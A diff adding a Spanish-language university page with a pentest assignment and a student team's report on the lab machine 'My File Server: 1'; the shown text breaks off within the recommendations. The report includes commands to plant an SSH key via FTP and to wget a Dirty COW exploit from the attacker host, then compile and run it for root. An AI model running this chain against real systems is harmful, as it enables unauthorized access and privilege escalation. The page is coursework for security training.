@@ -1,0 +1,706 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Actividad 09 :: Red Team Report</title>
+    <link rel="stylesheet" href="style.css">
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Exo+2:wght@300;600&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+</head>
+
+<body>
+    <!-- Fondo Animado -->
+    <div class="animated-bg"></div>
+    <div class="particles"></div>
+
+    <div class="app-container">
+        <!-- Navegación -->
+        <nav class="neon-nav">
+            <div class="nav-logo">JAVIER<span class="bad">XD1383</span></div>
+            <div class="nav-items">
+                <a href="index.html" class="nav-btn color-1"> INICIO</a>
+                <a href="actividades.html" class="nav-btn color-4"> ACTIVIDADES</a>
+                <a href="proyectos.html" class="nav-btn color-3"> PROYECTOS</a>
+                <div class="nav-dropdown">
+                    <span class="nav-btn color-hof nav-dropdown-btn">
+                        <i class="fas fa-trophy"></i> HALL OF FAME
+                        <i class="fas fa-chevron-down dropdown-arrow"></i>
+                    </span>
+                    <div class="nav-dropdown-menu">
+                        <div class="dropdown-header">ROAD TO HALL OF FAME</div>
+                        <div class="dropdown-divider"></div>
+                        <a href="actividad8.html" class="dropdown-item">
+                            <i class="fas fa-database"></i> SQL Injection
+                            <span class="item-tag">ACTIVO</span>
+                        </a>
+                    </div>
+                </div>
+            </div>
+        </nav>
+
+        <main>
+            <section class="slide-in">
+                <div class="article-container">
+                    <header class="article-header">
+                        <div class="article-meta">ACTIVIDAD 09 | RED TEAM REPORT</div>
+                        <h1 style="font-family:'Orbitron'; font-size: 2.0rem; margin-bottom: 10px; color: var(--c-yellow);">PENTESTING DE MY FILE SERVER 1</h1>
+                        
+                        <div class="team-box" style="background: rgba(255,255,255,0.05); padding: 15px; border-radius: 10px; margin-top: 20px; border-left: 3px solid var(--c-yellow);">
+                            <h4 style="color: var(--c-yellow); margin-bottom: 10px;">INTEGRANTES:</h4>
+                            <ul style="list-style: none; padding: 0; font-size: 0.9rem; color: #ddd; display: flex; flex-direction: column; gap: 8px; margin-bottom: 15px;">
+                                <li><i class="fas fa-user-check" style="color: var(--c-yellow);"></i> <strong>179033</strong> – Alonso Castillo Omar Karim</li>
+                                <li><i class="fas fa-user-check" style="color: var(--c-yellow);"></i> <strong>177622</strong> – Cruz Juárez Francisco Javier</li>
+                                <li><i class="fas fa-user-check" style="color: var(--c-yellow);"></i> <strong>175031</strong> – Espinoza Aguilar Brian Salvador</li>
+                                <li><i class="fas fa-user-check" style="color: var(--c-yellow);"></i> <strong>177685</strong> – Martinez Lara Santiago de la Cruz</li>
+                                <li><i class="fas fa-user-check" style="color: var(--c-yellow);"></i> <strong>173030</strong> – Sánchez Ramirez Mayeli</li>
+                                <li><i class="fas fa-user-check" style="color: var(--c-yellow);"></i> <strong>177263</strong> – Sánchez Zavala Alan Gilberto</li>
+                            </ul>
+                            <div style="font-size: 0.9rem; color: #ddd; display: flex; flex-direction: column; gap: 5px;">
+                                <p><strong>Profesor:</strong> Servando López Contreras</p>
+                                <p>UPSLP</p>
+                                <p><strong>Materia:</strong> Seguridad Informática V</p>
+                            </div>
+                        </div>
+                    
+                        <a href="Pdfs/actividad9.pdf" target="_blank" class="pdf-btn"
+                            style="text-decoration: none; display: inline-block; padding: 10px 20px; text-align: center; margin-top: 20px;">
+                            <i class="fas fa-file-pdf"></i> VER PDF ORIGINAL
+                        </a>
+                    </header>
+
+                    <article class="article-body">
+                        <h2><i class="fas fa-bullseye"></i> OBJETIVO GENERAL</h2>
+                        <div class="info-box">
+                            <p>Desarrollar un informe técnico profesional de pruebas de penetración (Pentesting Report) sobre la máquina vulnerable <strong>My File Server: 1</strong>, aplicando una metodología estructurada de evaluación de seguridad, documentando hallazgos, evidencias técnicas, análisis de riesgo y propuestas de mitigación, demostrando competencias en análisis ofensivo y redacción técnica profesional.</p>
+                        </div>
+                        
+                        <h2><i class="fas fa-list-ul"></i> OBJETIVOS ESPECÍFICOS</h2>
+                        <ul class="glowing-list">
+                            <li>Aplicar una metodología formal de pentesting (reconocimiento, enumeración, explotación y post-explotación).</li>
+                            <li>Identificar, explotar y documentar vulnerabilidades presentes en la máquina objetivo.</li>
+                            <li>Elaborar un informe técnico profesional con estructura ejecutiva y técnica, incluyendo evaluación de impacto y recomendaciones de remediación.</li>
+                        </ul>
+                        
+                        <p style="margin-top: 15px;"><strong>Duración aproximada:</strong> 06 horas y 30 minutos.</p>
+                        
+                        <div class="tech-divider"></div>
+                        
+                        <h2><i class="fas fa-server"></i> CONTEXTO DE LA MÁQUINA</h2>
+                        <div class="info-box" style="border-color: var(--c-cyan);">
+                            <p>La máquina <strong>My File Server: 1</strong> simula un entorno corporativo vulnerable orientado a servicios de almacenamiento/servidor de archivos.</p>
+                            <p>El estudiante actuará como <strong>analista Red Team contratado por la organización</strong> para evaluar el nivel de exposición del sistema.</p>
+                        </div>
+
+                        <div class="tech-divider"></div>
+
+                        <h2><i class="fas fa-file-alt"></i> ESTRUCTURA DEL INFORME</h2>
+                        <ol class="glowing-list">
+                            <li>Portada.</li>
+                            <li>Executive Summary (resumen ejecutivo).</li>
+                            <li>Alcance (scope).</li>
+                            <li>Metodología aplicada.</li>
+                            <li>Fases de reconocimiento.</li>
+                            <li>Enumeración.</li>
+                            <li>Explotación.</li>
+                            <li>Escalada de privilegios.</li>
+                            <li>Análisis de impacto (modelo CIA).</li>
+                            <li>Recomendaciones técnicas.</li>
+                            <li>Completar tabla de hallazgos (ID, Vulnerabilidad, Severidad, Evidencia, Impacto, Recomendación).</li>
+                        </ol>
+
+                        <div class="tech-divider"></div>
+
+                        <h2><i class="fas fa-project-diagram"></i> PRESENTACIÓN PROFESIONAL</h2>
+                        <div class="info-box" style="border-color: var(--c-purple);">
+                            <p>Después, el estudiante deberá preparar una <strong>presentación profesional</strong> como si estuviera frente al Consejo Directivo de una empresa.</p>
+                        </div>
+                        
+                        <h3 style="margin-top: 20px; color: var(--c-purple);">Características de la presentación:</h3>
+                        <ul class="glowing-list">
+                            <li>Diseño limpio, corporativo.</li>
+                            <li>Máximo 12 diapositivas.</li>
+                            <li>Enfoque estratégico (no técnico profundo).</li>
+                            <li>Lenguaje ejecutivo.</li>
+                            <li>Gráficos de riesgo.</li>
+                            <li>Nivel de impacto en negocio.</li>
+                        </ul>
+                        
+                        <h3 style="margin-top: 20px; color: var(--c-purple);">Estructura de la presentación:</h3>
+                        <ol class="glowing-list">
+                            <li>Portada corporativa.</li>
+                            <li>Contexto del Engagement.</li>
+                            <li>Metodología aplicada.</li>
+                            <li>Nivel general del riesgo.</li>
+                            <li>Hallazgos críticos.</li>
+                            <li>Escenario del impacto empresarial.</li>
+                            <li>Matriz de riesgo.</li>
+                            <li>Recomendaciones estratégicas.</li>
+                            <li>Roadmap de remediación.</li>
+                            <li>Conclusión ejecutiva.</li>
+                        </ol>
+
+                        <div class="tech-divider"></div>
+
+                        <h2><i class="fas fa-check-square"></i> RÚBRICA DE EVALUACIÓN</h2>
+                        <div style="overflow-x: auto; margin-top: 15px;">
+                            <table style="width: 100%; border-collapse: collapse; background: rgba(255,255,255,0.03); border: 1px solid rgba(255,255,255,0.1); color: #ccc; font-size: 0.85rem;">
+                                <thead>
+                                    <tr style="background: rgba(255,255,255,0.1); text-align: left;">
+                                        <th style="padding: 10px; border: 1px solid rgba(255,255,255,0.1);">Criterio</th>
+                                        <th style="padding: 10px; border: 1px solid rgba(255,255,255,0.1);">Ponderación</th>
+                                        <th style="padding: 10px; border: 1px solid rgba(255,255,255,0.1);">Excelente</th>
+                                        <th style="padding: 10px; border: 1px solid rgba(255,255,255,0.1);">Bueno</th>
+                                        <th style="padding: 10px; border: 1px solid rgba(255,255,255,0.1);">Regular</th>
+                                        <th style="padding: 10px; border: 1px solid rgba(255,255,255,0.1);">Insuficiente</th>
+                                    </tr>
+                                </thead>
+                                <tbody>
+                                    <tr>
+                                        <td style="padding: 10px; border: 1px solid rgba(255,255,255,0.1); font-weight: bold;">01. Metodología aplicada (PTES / OWASP)</td>
+                                        <td style="padding: 10px; border: 1px solid rgba(255,255,255,0.1); text-align: center;">20 pts.</td>
+                                        <td style="padding: 10px; border: 1px solid rgba(255,255,255,0.1);">18-20 pts. - Aplicación clara, estructurada y coherente de fases.</td>
+                                        <td style="padding: 10px; border: 1px solid rgba(255,255,255,0.1);">14-17 pts. - Metodología correcta pero con ligera falta de profundidad.</td>
+                                        <td style="padding: 10px; border: 1px solid rgba(255,255,255,0.1);">10-13 pts. - Fases mencionadas sin integración real.</td>
+                                        <td style="padding: 10px; border: 1px solid rgba(255,255,255,0.1);">0-9 pts. - Sin estructura.</td>
+                                    </tr>
+                                    <tr>
+                                        <td style="padding: 10px; border: 1px solid rgba(255,255,255,0.1); font-weight: bold;">02. Reconocimiento y Enumeración técnica</td>
+                                        <td style="padding: 10px; border: 1px solid rgba(255,255,255,0.1); text-align: center;">15 pts.</td>
+                                        <td style="padding: 10px; border: 1px solid rgba(255,255,255,0.1);">14-15 pts. - Escaneos correctamente ejecutados, interpretados y explicados.</td>
+                                        <td style="padding: 10px; border: 1px solid rgba(255,255,255,0.1);">11-13 pts. - Evidencia técnica adecuada con interpretación aceptable.</td>
+                                        <td style="padding: 10px; border: 1px solid rgba(255,255,255,0.1);">8-10 pts. - Solo capturas sin análisis profundo.</td>
+                                        <td style="padding: 10px; border: 1px solid rgba(255,255,255,0.1);">0-7 pts. - Escaneo incompleto o mal interpretado.</td>
+                                    </tr>
+                                    <tr>
+                                        <td style="padding: 10px; border: 1px solid rgba(255,255,255,0.1); font-weight: bold;">03. Calidad en la presentación del informe</td>
+                                        <td style="padding: 10px; border: 1px solid rgba(255,255,255,0.1); text-align: center;">15 pts.</td>
+                                        <td style="padding: 10px; border: 1px solid rgba(255,255,255,0.1);">14-15 pts. - Informe ejecutivo de alta calidad, formato profesional.</td>
+                                        <td style="padding: 10px; border: 1px solid rgba(255,255,255,0.1);">11-13 pts. - Presentación adecuada con errores menores.</td>
+                                        <td style="padding: 10px; border: 1px solid rgba(255,255,255,0.1);">8-10 pts. - Presentación descuidada o poco clara.</td>
+                                        <td style="padding: 10px; border: 1px solid rgba(255,255,255,0.1);">0-7 pts. - Desordenado, difícil de leer.</td>
+                                    </tr>
+                                    <tr>
+                                        <td style="padding: 10px; border: 1px solid rgba(255,255,255,0.1); font-weight: bold;">04. Explotación documentada</td>
+                                        <td style="padding: 10px; border: 1px solid rgba(255,255,255,0.1); text-align: center;">20 pts.</td>
+                                        <td style="padding: 10px; border: 1px solid rgba(255,255,255,0.1);">18-20 pts. - Vulnerabilidad explotada con evidencia clara y reproducible.</td>
+                                        <td style="padding: 10px; border: 1px solid rgba(255,255,255,0.1);">14-17 pts. - Explotación lograda pero con documentación parcial.</td>
+                                        <td style="padding: 10px; border: 1px solid rgba(255,255,255,0.1);">10-13 pts. - Evidencia mínima o confusa.</td>
+                                        <td style="padding: 10px; border: 1px solid rgba(255,255,255,0.1);">0-9 pts. - No logra explotación.</td>
+                                    </tr>
+                                    <tr>
+                                        <td style="padding: 10px; border: 1px solid rgba(255,255,255,0.1); font-weight: bold;">05. Presentación Ejecutiva Corporativa</td>
+                                        <td style="padding: 10px; border: 1px solid rgba(255,255,255,0.1); text-align: center;">15 pts.</td>
+                                        <td style="padding: 10px; border: 1px solid rgba(255,255,255,0.1);">14-15 pts. - Comunicación estratégica, visual profesional.</td>
+                                        <td style="padding: 10px; border: 1px solid rgba(255,255,255,0.1);">11-13 pts. - Presentación clara pero con diseño mejorable.</td>
+                                        <td style="padding: 10px; border: 1px solid rgba(255,255,255,0.1);">8-10 pts. - Slides saturadas o lectura textual.</td>
+                                        <td style="padding: 10px; border: 1px solid rgba(255,255,255,0.1);">0-7 pts. - Presentación improvisada.</td>
+                                    </tr>
+                                    <tr>
+                                        <td style="padding: 10px; border: 1px solid rgba(255,255,255,0.1); font-weight: bold;">06. Pensamiento Crítico y Nivel Analítico</td>
+                                        <td style="padding: 10px; border: 1px solid rgba(255,255,255,0.1); text-align: center;">15 pts.</td>
+                                        <td style="padding: 10px; border: 1px solid rgba(255,255,255,0.1);">14-15 pts. - Comprensión profunda del vector de ataque.</td>
+                                        <td style="padding: 10px; border: 1px solid rgba(255,255,255,0.1);">11-13 pts. - Buen análisis con limitaciones menores.</td>
+                                        <td style="padding: 10px; border: 1px solid rgba(255,255,255,0.1);">8-10 pts. - Análisis superficial.</td>
+                                        <td style="padding: 10px; border: 1px solid rgba(255,255,255,0.1);">0-7 pts. - Trabajo mecánico.</td>
+                                    </tr>
+                                </tbody>
+                            </table>
+                        </div>
+                    </article>
+
+                    <div class="tech-divider"></div>
+
+                    <!-- REPORTE TÉCNICO START -->
+                    <article class="article-body">
+                        <div style="text-align: center; margin-bottom: 30px; border-bottom: 2px solid var(--c-yellow); padding-bottom: 20px;">
+                            <h1 style="font-family:'Orbitron'; font-size: 2.2rem; margin-bottom: 5px; color: #fff;">REPORTE TÉCNICO DE PENTESTING</h1>
+                            <h2 style="font-family:'Orbitron'; font-size: 1.6rem; color: var(--c-yellow);">Red Team Report – My File Server 1</h2>
+                        </div>
+
+                        <h2><i class="fas fa-file-alt"></i> Contenido</h2>
+                        <ul style="list-style: none; padding-left: 10px; font-family: monospace; color: #ccc; line-height: 1.8;">
+                            <li>2. Executive Summary ................................ 1</li>
+                            <li>3. Alcance .......................................... 1</li>
+                            <li>4. Metodología aplicada ............................. 1</li>
+                            <li>5. Fases de reconocimiento .......................... 1</li>
+                            <li>6. Enumeración ...................................... 2</li>
+                            <li>7. Explotación ...................................... 5</li>
+                            <li>8. Escalada de privilegios .......................... 7</li>
+                            <li>9. Análisis de impacto (modelo CIA) ................. 10</li>
+                            <li>10. Recomendaciones técnicas ........................ 10</li>
+                            <li>11. Tabla de hallazgos .............................. 11</li>
+                            <li>12. Bibliografías ................................... 12</li>
+                        </ul>
+
+                        <div class="tech-divider"></div>
+
+                        <h2 style="color: var(--c-yellow);">2. Executive Summary</h2>
+                        <div class="info-box">
+                            <p>El presente informe documenta la prueba de penetración realizada sobre la máquina vulnerable My File Server: 1. El objetivo fue evaluar la exposición de servicios, la existencia de credenciales expuestas y la posibilidad de escalada de privilegios.</p>
+                            <p style="margin-top: 10px;">Durante la evaluación se identificaron credenciales en texto plano dentro de <code>/readme.txt</code>, un recurso SMB (smbdata) accesible con permisos de lectura/escritura y una vulnerabilidad local de escalada (explotación de Dirty COW) que permitió obtención de privilegios de root. El riesgo combinado es alto: un atacante con acceso a la red podría exfiltrar información, modificar archivos y tomar control total del servidor.</p>
+                            <p style="margin-top: 10px;">En las páginas siguientes se detallan evidencias técnicas, análisis de impacto (confidencialidad, integridad y disponibilidad) y recomendaciones priorizadas para mitigar los riesgos.</p>
+                        </div>
+
+                        <h2 style="color: var(--c-yellow); margin-top: 30px;">3. Alcance</h2>
+                        <div class="info-box" style="border-color: var(--c-cyan);">
+                            <p><strong>Alcance de la prueba:</strong> evaluación negra (black-box) de la máquina virtual <em>My File Server: 1</em> con IP 192.168.56.103. Se incluyeron las siguientes actividades: reconocimiento de red, escaneo de puertos y servicios, enumeración de servicios web y SMB, intento de explotación de vulnerabilidades públicas y pruebas de escalada de privilegios locales.</p>
+                            <p style="margin-top: 10px;">Quedan fuera del alcance: ataques de denegación de servicio dirigidos a interrumpir producción y cambios permanentes en sistemas de terceros.</p>
+                        </div>
+
+                        <h2 style="color: var(--c-yellow); margin-top: 30px;">4. Metodología aplicada</h2>
+                        <div class="info-box" style="border-color: var(--c-purple);">
+                            <p>Se siguió un enfoque estructurado basado en las fases PTES/OWASP:</p>
+                            <ol class="glowing-list" style="margin-top: 10px;">
+                                <li>Reconocimiento pasivo y activo.</li>
+                                <li>Enumeración detallada de servicios y versiones.</li>
+                                <li>Identificación y validación de vulnerabilidades.</li>
+                                <li>Explotación controlada para demostrar impacto.</li>
+                                <li>Post-explotación y escalada de privilegios.</li>
+                                <li>Análisis de impacto y recomendaciones.</li>
+                            </ol>
+                            <p style="margin-top: 10px;">Para cada fase se registraron comandos, salidas y evidencias reproducibles; se priorizaron técnicas no destructivas salvo autorización explícita.</p>
+                        </div>
+
+                        <h2 style="color: var(--c-yellow); margin-top: 30px;">5. Fases de reconocimiento</h2>
+                        <div class="sec">
+                            <p>Primero se realizó reconocimiento pasivo para detectar hosts activos con <code>netdiscover</code>.</p>
+                            
+                            <!-- IMAGEN: NETDISCOVER COMMAND -->
+                            <div style="margin: 15px 0; text-align: center;">
+                                <img src="img/act9_netdiscover.png" alt="Ejecución de sudo netdiscover" style="max-width: 100%; border-radius: 8px; border: 1px solid rgba(255,255,255,0.2);">
+                            </div>
+                            
+                            <p>El comando muestra las máquinas que se encuentran en la misma red del host, identificamos que la IP <strong>192.168.56.103</strong> es nuestra máquina víctima.</p>
+
+                            <!-- ESPACIO PARA IMAGEN: NETDISCOVER RESULT -->
+                            <!-- IMAGEN -->
+                            <div style="margin: 15px 0; text-align: center;">
+                                <img src="img/actividad9/evidencia2.png" alt="Evidencia 2" style="max-width: 100%; border-radius: 8px; border: 1px solid rgba(255,255,255,0.2);">
+                            </div>
+
+                            <p>A continuación, se ejecutó un escaneo activo de puertos y servicios con <code>nmap -p- 192.168.56.103 -sV</code> para obtener la lista exhaustiva de puertos abiertos y versiones.</p>
+
+                            <!-- ESPACIO PARA IMAGEN: NMAP COMMAND -->
+                            <!-- IMAGEN -->
+                            <div style="margin: 15px 0; text-align: center;">
+                                <img src="img/actividad9/evidencia3.png" alt="Evidencia 3" style="max-width: 100%; border-radius: 8px; border: 1px solid rgba(255,255,255,0.2);">
+                            </div>
+
+                            <p><strong>Vulnerabilidades encontradas:</strong></p>
+                            <!-- ESPACIO PARA IMAGEN: NMAP RESULT -->
+                            <!-- IMAGEN -->
+                            <div style="margin: 15px 0; text-align: center;">
+                                <img src="img/actividad9/evidencia4.png" alt="Evidencia 4" style="max-width: 100%; border-radius: 8px; border: 1px solid rgba(255,255,255,0.2);">
+                            </div>
+                        </div>
+
+                        <h2 style="color: var(--c-yellow); margin-top: 30px;">6. Enumeración</h2>
+                        <div class="sec">
+                            <p>Se utilizaron herramientas de enumeración para determinar vectores de ataque:</p>
+                            <p style="margin-top: 10px;">Ejecutamos el comando <code>nikto -h</code> para enumerar directorios del servicio web:</p>
+
+                            <!-- ESPACIO PARA IMAGEN: NIKTO COMMAND -->
+                            <!-- IMAGEN -->
+                            <div style="margin: 15px 0; text-align: center;">
+                                <img src="img/actividad9/evidencia5.png" alt="Evidencia 5" style="max-width: 100%; border-radius: 8px; border: 1px solid rgba(255,255,255,0.2);">
+                            </div>
+
+                            <!-- ESPACIO PARA IMAGEN: NIKTO RESULT -->
+                            <!-- IMAGEN -->
+                            <div style="margin: 15px 0; text-align: center;">
+                                <img src="img/actividad9/evidencia6.png" alt="Evidencia 6" style="max-width: 100%; border-radius: 8px; border: 1px solid rgba(255,255,255,0.2);">
+                            </div>
+
+                            <p>Vemos que nikto reveló el fichero <code>/readme.txt</code> el cual puede ser interesante.</p>
+                            <p style="margin-top: 10px;">Abrimos la dirección <strong>192.168.56.103/readme.txt</strong> para visualizar el contenido y vemos que incluye la cadena <code>My password is rootroot1</code></p>
+
+                            <!-- ESPACIO PARA IMAGEN: BROWSER README -->
+                            <!-- IMAGEN -->
+                            <div style="margin: 15px 0; text-align: center;">
+                                <img src="img/actividad9/evidencia7.png" alt="Evidencia 7" style="max-width: 100%; border-radius: 8px; border: 1px solid rgba(255,255,255,0.2);">
+                            </div>
+
+                            <p>Con esto obtenemos la contraseña <strong>"rootroot1"</strong> del usuario <strong>smbuser</strong>.</p>
+                            <p style="margin-top: 10px;">Utilizamos el comando <code>sudo smbmap -H 192.168.56.103</code> para enumerar las variables.</p>
+
+                            <!-- ESPACIO PARA IMAGEN: SMBMAP COMMAND -->
+                            <!-- IMAGEN -->
+                            <div style="margin: 15px 0; text-align: center;">
+                                <img src="img/actividad9/evidencia8.png" alt="Evidencia 8" style="max-width: 100%; border-radius: 8px; border: 1px solid rgba(255,255,255,0.2);">
+                            </div>
+
+                            <p>smbmap mostró el recurso <strong>smbdata</strong> con permisos de lectura y escritura, lo que permite listar y transferir ficheros. Además, el servicio HTTP reportó versión Apache 2.4.6, la cual debe compararse con bases de CVE para verificar parches pendientes.</p>
+
+                            <!-- ESPACIO PARA IMAGEN: SMBMAP RESULT -->
+                            <!-- IMAGEN -->
+                            <div style="margin: 15px 0; text-align: center;">
+                                <img src="img/actividad9/evidencia9.png" alt="Evidencia 9" style="max-width: 100%; border-radius: 8px; border: 1px solid rgba(255,255,255,0.2);">
+                            </div>
+                        </div>
+
+                        <h2 style="color: var(--c-yellow); margin-top: 30px;">7. Explotación</h2>
+                        <div class="sec">
+                            <p>Utilizamos el comando ftp, aquí ya estamos conectados al servidor de archivos, pero esto no es seguro, ya que si se realiza una auditoria encontraran todos nuestros movimientos, debemos encriptar la información con ssh con la llave del siguiente comando.</p>
+
+                            <!-- ESPACIO PARA IMAGEN: FTP LOGIN -->
+                            <!-- IMAGEN -->
+                            <div style="margin: 15px 0; text-align: center;">
+                                <img src="img/actividad9/evidencia10.png" alt="Evidencia 10" style="max-width: 100%; border-radius: 8px; border: 1px solid rgba(255,255,255,0.2);">
+                            </div>
+
+                            <p>Generamos la llave para establecer la comunicaion con el comando <code>sudo ssh-keygen</code></p>
+
+                            <!-- ESPACIO PARA IMAGEN: SSH-KEYGEN -->
+                            <!-- IMAGEN -->
+                            <div style="margin: 15px 0; text-align: center;">
+                                <img src="img/actividad9/evidencia11.png" alt="Evidencia 11" style="max-width: 100%; border-radius: 8px; border: 1px solid rgba(255,255,255,0.2);">
+                            </div>
+
+                            <p>Debemos agregar la llave en el directorio .ssh, para ello primero iniciamos como super usuario: <code>sudo su</code></p>
+
+                            <!-- ESPACIO PARA IMAGEN: SUDO SU -->
+                            <!-- IMAGEN -->
+                            <div style="margin: 15px 0; text-align: center;">
+                                <img src="img/actividad9/evidencia12.png" alt="Evidencia 12" style="max-width: 100%; border-radius: 8px; border: 1px solid rgba(255,255,255,0.2);">
+                            </div>
+
+                            <p>Posteriormente nos dirigimos a la carpeta raíz y utilizamos el comando ftp para conectarnos a la máquina víctima mediante su dirección IP. Una vez establecida la conexión, se creó el directorio .ssh en el sistema remoto y se accedió a él.<br>Desde este directorio se transfirió la clave pública generada previamente con el comando ssh-keygen, utilizando el comando:</p>
+
+                            <ul class="glowing-list" style="margin: 10px 0;">
+                                <li><code>put id_ed25519.pub authorized_keys</code></li>
+                            </ul>
+
+                            <p>Este procedimiento copia la clave pública al archivo authorized_keys, permitiendo que el sistema remoto acepte autenticación mediante clave SSH desde la máquina atacante. De esta forma se puede establecer acceso remoto sin necesidad de contraseña utilizando el cliente SSH.</p>
+
+                            <!-- ESPACIO PARA IMAGEN: FTP TRANSFER -->
+                            <!-- IMAGEN -->
+                            <div style="margin: 15px 0; text-align: center;">
+                                <img src="img/actividad9/evidencia13.png" alt="Evidencia 13" style="max-width: 100%; border-radius: 8px; border: 1px solid rgba(255,255,255,0.2);">
+                            </div>
+
+                            <p>Una vez configurada la autenticación mediante claves SSH, es posible acceder al sistema remoto utilizando el siguiente comando: <code>ssh smbuser@192.168.56.103</code></p>
+
+                            <!-- ESPACIO PARA IMAGEN: SSH LOGIN -->
+                            <!-- IMAGEN -->
+                            <div style="margin: 15px 0; text-align: center;">
+                                <img src="img/actividad9/evidencia14.png" alt="Evidencia 14" style="max-width: 100%; border-radius: 8px; border: 1px solid rgba(255,255,255,0.2);">
+                            </div>
+
+                            <p>Con esto se obtiene acceso al sistema con los privilegios del usuario <strong>smbuser</strong>.</p>
+                        </div>
+
+                        <h2 style="color: var(--c-yellow); margin-top: 30px;">8. Escalada de privilegios</h2>
+                        <div class="sec">
+                            <p>La escalada empleada fue Dirty COW (CVE-2016-5195), que explota una condición de carrera en el mecanismo copy-on-write del kernel Linux permitiendo modificar archivos propietarios y obtener privilegios de root.</p>
+
+                            <!-- ESPACIO PARA IMAGEN: DIRTY COW GITHUB -->
+                            <!-- IMAGEN -->
+                            <div style="margin: 15px 0; text-align: center;">
+                                <img src="img/actividad9/evidencia15.png" alt="Evidencia 15" style="max-width: 100%; border-radius: 8px; border: 1px solid rgba(255,255,255,0.2);">
+                            </div>
+
+                            <p>Pegamos el código en la máquina de Linux y lo guardamos con el nombre <code>dirtyCow.c</code></p>
+
+                            <!-- ESPACIO PARA IMAGEN: DIRTY COW CODE -->
+                            <!-- IMAGEN -->
+                            <div style="margin: 15px 0; text-align: center;">
+                                <img src="img/actividad9/evidencia16.png" alt="Evidencia 16" style="max-width: 100%; border-radius: 8px; border: 1px solid rgba(255,255,255,0.2);">
+                            </div>
+
+                            <p>Se abrió una nueva terminal en la máquina atacante y se levantó un servidor HTTP temporal utilizando el comando: <code>python3 -m http.server 8080</code></p>
+                            <p style="margin-top: 10px;">Este servidor se utilizó para alojar el archivo del exploit dirtyCow.c, permitiendo que la máquina víctima pudiera descargarlo mediante una solicitud HTTP.</p>
+
+                            <!-- ESPACIO PARA IMAGEN: PYTHON HTTP SERVER -->
+                            <!-- IMAGEN -->
+                            <div style="margin: 15px 0; text-align: center;">
+                                <img src="img/actividad9/evidencia17.png" alt="Evidencia 17" style="max-width: 100%; border-radius: 8px; border: 1px solid rgba(255,255,255,0.2);">
+                            </div>
+
+                            <p>Una vez iniciado el servidor HTTP, se pudo observar en la terminal que el servidor queda a la espera de peticiones entrantes desde la máquina víctima.</p>
+                            <p style="margin-top: 10px;">Después de levantar el servidor HTTP, regresamos a la terminal donde se había establecido la conexión con la máquina víctima mediante SSH. Desde esta terminal se utilizó el comando:</p>
+
+                            <ul class="glowing-list" style="margin: 10px 0;">
+                                <li><code>wget http://192.168.56.102:8080/dirtyCow.c</code></li>
+                            </ul>
+
+                            <p>Este comando permitió descargar el archivo dirtyCow.c desde la máquina atacante hacia la máquina víctima. Posteriormente, el archivo descargado se utilizaría para compilar y ejecutar el exploit correspondiente a la vulnerabilidad Dirty COW.</p>
+
+                            <!-- ESPACIO PARA IMAGEN: WGET DIRTY COW -->
+                            <!-- IMAGEN -->
+                            <div style="margin: 15px 0; text-align: center;">
+                                <img src="img/actividad9/evidencia18.png" alt="Evidencia 18" style="max-width: 100%; border-radius: 8px; border: 1px solid rgba(255,255,255,0.2);">
+                            </div>
+
+                            <p>En la otra terminal se puede ver que el servidor que levantamos escucha las peticiones</p>
+
+                            <!-- ESPACIO PARA IMAGEN: PYTHON SERVER GET REQUEST -->
+                            <!-- IMAGEN -->
+                            <div style="margin: 15px 0; text-align: center;">
+                                <img src="img/actividad9/evidencia19.png" alt="Evidencia 19" style="max-width: 100%; border-radius: 8px; border: 1px solid rgba(255,255,255,0.2);">
+                            </div>
+
+                            <p>Posteriormente regresamos a la terminal donde se tenía acceso a la máquina víctima mediante SSH. Desde esta terminal se compiló el código fuente del exploit utilizando el siguiente comando:</p>
+
+                            <ul class="glowing-list" style="margin: 10px 0;">
+                                <li><code>gcc dirtyCow.c -o Aznar -pthread</code></li>
+                            </ul>
+
+                            <p>Este comando compila el archivo dirtyCow.c y genera un archivo ejecutable llamado Aznar, el cual contiene el exploit correspondiente a la vulnerabilidad Dirty COW.</p>
+                            <p style="margin-top: 10px;">Finalmente, para intentar escalar privilegios dentro del sistema se ejecutó el archivo compilado mediante el comando:</p>
+
+                            <ul class="glowing-list" style="margin: 10px 0;">
+                                <li><code>./Aznar</code></li>
+                            </ul>
+
+                            <!-- ESPACIO PARA IMAGEN: COMPILE AND EXECUTE EXPLOIT -->
+                            <!-- IMAGEN -->
+                            <div style="margin: 15px 0; text-align: center;">
+                                <img src="img/actividad9/evidencia20.png" alt="Evidencia 20" style="max-width: 100%; border-radius: 8px; border: 1px solid rgba(255,255,255,0.2);">
+                            </div>
+
+                            <p>La ejecución del exploit permite aprovechar la vulnerabilidad presente en el kernel de Linux con el objetivo de escalar privilegios dentro del sistema.</p>
+                        </div>
+
+                        <h2 style="color: var(--c-yellow); margin-top: 30px;">9. Análisis de impacto (modelo CIA)</h2>
+                        <div class="info-box" style="border-color: var(--c-purple);">
+                            <p><strong>Confidencialidad:</strong> comprometida por la presencia de credenciales en texto plano (<code>/readme.txt</code>) y la posibilidad de leer el share SMB; incertidumbre sobre datos sensibles alojados en smbdata.</p>
+                            <p style="margin-top: 10px;"><strong>Integridad:</strong> vulnerable ante modificaciones no autorizadas en la share (permisos R/W) y la capacidad de reemplazar binarios o ficheros críticos tras escalada.</p>
+                            <p style="margin-top: 10px;"><strong>Disponibilidad:</strong> posible interrupción si se eliminan o corrompen ficheros críticos o si el atacante instala procesos maliciosos.</p>
+                            <p style="margin-top: 10px; color: var(--c-red);">El riesgo global se cataloga como <strong>alto</strong> por la combinación de acceso inicial sencillo y disponibilidad de escalada a root.</p>
+                        </div>
+
+                        <h2 style="color: var(--c-yellow); margin-top: 30px;">10. Recomendaciones técnicas</h2>
+                        <ol class="glowing-list">
+                            <li><strong>Crítico (inmediato):</strong> parchear el kernel para mitigar CVE-2016-5195; si no es posible, aislar la VM hasta aplicar parche.</li>
+                            <li><strong>Alto:</strong> eliminar credenciales en texto plano, rotar contraseñas expuestas y aplicar políticas de contraseñas seguras.</li>
+                            <li><strong>Alto:</strong> restringir permisos del share SMB (smbdata) usando ACLs y principios de menor privilegio; deshabilitar accesos anónimos.</li>
+                            <li><strong>Medio:</strong> revisar y actualizar Apache (y demás servicios) según CVE; deshabilitar módulos innecesarios.</li>
